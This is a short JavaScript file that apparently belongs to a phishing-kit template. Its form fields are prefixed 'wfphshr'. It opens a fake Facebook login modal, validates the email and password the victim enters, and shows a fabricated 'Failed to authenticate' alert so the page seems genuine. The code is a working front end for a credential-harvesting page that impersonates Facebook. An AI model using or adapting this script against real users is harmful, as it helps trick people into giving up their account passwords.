$(document).on("ready", function() {

  $("#fbButton").on("click", showModal)
  $("#facebookModal .close").on("click", closeModal)
});


function validateForm() {
  var x = document.forms["theform"]["wfphshr-email"].value;
  var atpos = x.indexOf("@");
  var dotpos = x.lastIndexOf(".");
  if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length) {
      alert("Failed to authenticate. Wrong Email or Password.");
      return false;
  }

  var x = document.forms["theform"]["wfphshr-password"].value;
  if (5>=x.length) {
      alert("Failed to authenticate. Wrong Email or Password.");
      return false;

  }
}

function showModal() {
  $("#facebookModalContainer").fadeIn();
}

function closeModal() {
  $("#facebookModalContainer").fadeOut();
}
